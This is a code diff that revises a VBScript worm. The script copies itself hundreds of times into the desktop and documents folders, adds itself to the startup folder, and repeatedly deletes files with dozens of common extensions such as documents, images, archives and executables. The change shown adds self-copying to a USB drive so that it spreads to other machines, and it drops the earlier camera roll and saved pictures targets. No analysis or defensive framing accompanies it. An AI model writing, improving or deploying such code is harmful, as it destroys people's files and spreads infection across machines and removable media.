@@ -11,37 +11,31 @@ strDesktopFolder = objShell.SpecialFolders("Desktop")
 ' Get the path to the documents folder
 strDocumentsFolder = objShell.SpecialFolders("MyDocuments")
 
-' Get the path to the camera roll folder
-strCameraRollFolder = objShell.SpecialFolders("CameraRoll")
-
-' Get the path to the saved pictures folder
-strSavedPicturesFolder = objShell.SpecialFolders("SavedPictures")
-
 ' Specify the number of copies to create
 numCopies = 999
 
-' Generate copies of the script
+' Specify the path to the USB drive
+usbDrivePath = "F:\"
+
+' Generate copies of the script on the USB drive
 For i = 1 To numCopies
     randomIteration = Int((1000 * Rnd) + 1)
 
-    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
+    strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
+Next
+
+' Create copies of the script on the desktop and in the documents folder
+For i = 1 To numCopies
+    randomIteration = Int((1000 * Rnd) + 1)
 
     ' Create a copy of the script on the desktop
     strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
 
     ' Create a copy of the script in the documents folder
     strDocumentsCopyPath = strDocumentsFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
-
-    ' Create a copy of the script in the camera roll folder
-    strCameraRollCopyPath = strCameraRollFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strCameraRollCopyPath, True ' Add "True" to overwrite existing files
-
-    ' Create a copy of the script in the saved pictures folder
-    strSavedPicturesCopyPath = strSavedPicturesFolder & "\Copy" & randomIteration & ".vbs"
-    objFSO.CopyFile strCopyPath, strSavedPicturesCopyPath, True ' Add "True" to overwrite existing files
+    objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
 Next
 
 ' Add the script to the startup folder
@@ -64,7 +58,7 @@ Do
         Dim extension
         extension = LCase(objFSO.GetExtensionName(objFile.Name))
         If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
-            objFSO.DeleteFile(objFile.Path)
+            objFSO.DeleteFile(objFile)
         End If
     Next
 
@@ -82,6 +76,13 @@ Do
             strCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
             objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
         Next
+    Next
+
+    ' Generate copies of the script on the USB drive
+    For i = 1 To numCopies
+        randomIteration = Int((1000 * Rnd) + 1)
+        strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
+        objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     Next
 
 Loop
